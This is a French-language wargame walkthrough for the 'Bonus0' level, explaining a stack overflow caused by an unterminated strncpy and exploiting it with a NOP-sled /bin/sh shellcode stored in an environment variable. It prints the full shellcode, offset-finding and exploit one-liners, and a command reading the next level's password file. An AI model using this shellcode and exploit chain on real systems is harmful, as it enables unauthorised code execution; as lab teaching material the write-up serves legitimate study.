# Bonus0 — Walkthrough

> **En résumé :** `main` appelle `pp`, qui lit deux mots via `p` puis les concatène. Le bug vient de `p` : son `strncpy` de 20 octets ne pose pas de `\0` final, donc le premier mot « déborde » sur le second, la concaténation dépasse le buffer de 54 octets et écrase EIP → shellcode.

```mermaid
flowchart TD
    A["main()<br/>result[54]"] --> B["pp(result)"]
    B --> C["p(mot1, ' - ')<br/>lit le 1er mot → 20 octets"]
    B --> D["p(mot2, ' - ')<br/>lit le 2e mot → 20 octets"]

    C -- "input = 20 chars" --> E["mot1 SANS '\0' final<br/>(strncpy n'en pose pas)"]

    E --> F["strcpy(result, mot1)<br/>ne trouve pas de '\0'<br/>→ continue dans mot2<br/>→ copie 40 octets"]
    D --> F

    F --> G["+ ' ' + strcat(result, mot2)<br/>[mot1 20][mot2 20][' '][mot2 20] + '\0'<br/>= 40 + 1 + 20 + 1 = 62 octets dans result[54]"]
    G --> H["DÉBORDEMENT<br/>EIP (adresse de retour) écrasée"]
    H --> I["EIP → NOP sled (variable d'env)<br/>→ shellcode → shell bonus1"]

    style E fill:#ffe0b2,stroke:#e65100
    style F fill:#ffcdd2,stroke:#b71c1c
    style H fill:#ffcdd2,stroke:#b71c1c
    style I fill:#c8e6c9,stroke:#1b5e20
```

## Analyse du code

Trois fonctions :

```
main()
  └─ pp(result[54])          // remplit un buffer de 54 bytes
       ├─ p(local_34, ...)   // lit le 1er mot  → 20 bytes max
       ├─ p(local_20, ...)   // lit le 2ème mot → 20 bytes max
       ├─ strcpy(result, local_34)
       ├─ result[strlen] = ' '
       ├─ result[strlen+1] = '\0'
       └─ strcat(result, local_20)
```

### La fonction `p()` — source de la vulnérabilité

```c
void p(char *dest, char *prompt) {
    char buf[4104];
    read(0, buf, 4096);
    *strchr(buf, '\n') = '\0';
    strncpy(dest, buf, 20);   // ⚠️ pas de \0 si input == 20 chars
}
```

`strncpy(dest, buf, 20)` ne pose **pas** de null-terminateur si l'input fait exactement 20 caractères.

---

## La vulnérabilité — strncpy sans null-terminateur

Sur la stack de `pp()`, les deux buffers sont **adjacents** en mémoire :

```
adresses croissantes →
┌────────────────────┬────────────────────┐
│   local_34 [20]    │   local_20 [20]    │
└────────────────────┴────────────────────┘
  EBP - 52             EBP - 32
```

Si on remplit `local_34` avec 20 chars (pas de `\0`), alors :

```c
strcpy(result, local_34)
```

...ne trouve pas de `\0` dans `local_34`, continue dans `local_20`, et copie
les **40 bytes** des deux buffers d'un coup dans `result`.

Ensuite `strcat(result, local_20)` rajoute encore 20 bytes.

### Ce qui est écrit dans result[54]

```
strcpy  → 40 bytes  (local_34 + local_20 fusionnés)
' '     →  1 byte
strcat  → 20 bytes  (local_20 à nouveau)
'\0'    →  1 byte
─────────────────
total   → 62 bytes dans result[54]  → OVERFLOW
```

### Stack de main()

```
adresses croissantes →
┌──────────────────────┬────────────┬────────────────────┐
│   result[54]         │ saved EBP  │  return addr (EIP) │
│   offset 0..53       │  54..57    │  58..61            │
└──────────────────────┴────────────┴────────────────────┘
  ← EBP - 58
```

62 bytes écrits → on écrase EIP. ✓

> **Le but de tout l'exploit : contrôler EIP.**
> EIP est le registre qui contient l'**adresse de la prochaine instruction à
> exécuter** — le « doigt » que le CPU suit dans le code. Quand une fonction se
> termine (`ret`), le CPU charge dans EIP l'**adresse de retour** stockée sur la
> pile. En débordant `result`, on écrase justement cette adresse de retour :
> au `ret`, le CPU saute donc là où **nous** voulons (notre shellcode) au lieu
> de revenir dans `main`. Maîtriser EIP = maîtriser ce que la machine exécute.

---

## Trouver l'offset

On envoie un pattern reconnaissable pour identifier quels bytes atterrissent dans EIP :

```bash
(python -c "print 'A'*20"; sleep 1; python -c "print 'BBBBCCCCDDDDEEEEFFFFGG'"; cat) | gdb -q ~/bonus0 -ex run -ex "info registers eip"
```

> ⚠️ Le `sleep 1` est **indispensable**. `read()` lit jusqu'à 4096 octets d'un
> coup : sans pause, le 1er `read()` avale les DEUX mots, et le 2e `read()`
> tombe sur EOF → `strchr` renvoie NULL → crash dans `p()` (et non sur EIP).
> Le `sleep` sépare les deux écritures pour que chaque `read()` ait son mot.
> Le `cat` final garde stdin ouvert.

Crash à `0x45444444` → bytes en mémoire (little-endian) : `44 44 44 45` = `D D D E`

```
position : 0123456789...
input    : BBBBCCCCDDDDEEEEFFFFGG
                    ^^^^
                    9  12   ← "DDDE" = octets posés sur EIP (index à partir de 0)
```

Les bytes aux **positions 9 à 12 (index 0) du 2ème input** atterrissent dans EIP.
C'est donc là qu'on placera l'adresse de retour : `'A'*9 + <adresse> + 'A'*7` (9 + 4 + 7 = 20).

---

## Exploit — shellcode en variable d'environnement

NX étant désactivé, on peut exécuter du code directement sur la stack.
On place le shellcode dans une variable d'environnement avec un NOP sled pour
ne pas avoir à viser exactement le premier byte.

### Schéma global

```
Mémoire au moment de l'exécution :

  [ variable d'env SHELLCODE              ]   [ stack de main         ]
  [ \x90 \x90 ... \x90 | /bin/sh shellcode]   [ result[54] | EBP | EIP ]
         NOP sled (100 bytes)                              ↑
                                                  on écrase EIP
                                                  avec l'adresse du sled
```

On n'a pas besoin de viser précisément le shellcode, n'importe quelle adresse
dans le NOP sled fonctionne — le CPU avance instruction par instruction jusqu'au shellcode.

### Étape 1 — Exporter le shellcode

```bash
export SHELLCODE=$(python -c "print '\x90'*100 + '\x31\xc0\x50\x68\x2f\x2f\x73\x68\x68\x2f\x62\x69\x6e\x89\xe3\x50\x53\x89\xe1\xb0\x0b\xcd\x80'")
```

### Étape 2 — Trouver l'adresse de la variable d'env

```c
// /tmp/getenv.c
#include <stdio.h>
#include <stdlib.h>
int main() {
    printf("%p\n", getenv("SHELLCODE"));
    return 0;
}
```

```bash
gcc /tmp/getenv.c -o /tmp/getenv
/tmp/getenv
# → 0xbffff8a3
```

### Étape 3 — Construire l'input

```
2ème input (20 bytes) :
┌─────────────┬──────────────────────────┬─────────────┐
│  'A' * 9    │  \xa3\xf8\xff\xbf        │  'A' * 7    │
│  padding    │  adresse (little-endian) │  padding    │
└─────────────┴──────────────────────────┴─────────────┘
  pos 0..8       pos 9..12                 pos 13..19
                      ↑
                  atterrit dans EIP
```

### Étape 4 — Lancer l'exploit

```bash
(python -c "print 'A'*20"; sleep 1; python -c "print 'A'*9 + '\xa3\xf8\xff\xbf' + 'A'*7"; cat) | ~/bonus0
```

Le `sleep 1` sépare les deux `read()` (cf. section « Trouver l'offset »), et le
`cat` final garde stdin ouvert pour que le shell puisse recevoir des commandes.

```bash
whoami          # → bonus1
cat /home/user/bonus1/.pass
```

---

## Concepts à retenir

| Concept | Explication |
|---|---|
| `strncpy` sans null | Si l'input fait exactement N chars, pas de `\0` → buffer suivant fusionné |
| NOP sled | Zone de `\x90` avant le shellcode pour ne pas viser exactement |
| Variable d'env | Façon propre de stocker un shellcode sans contrainte de taille |
| Little-endian | Une adresse `0xbffff8a3` s'écrit `\xa3\xf8\xff\xbf` dans le payload |
| `cat` dans le pipe | Garde stdin ouvert pour interagir avec le shell spawné |
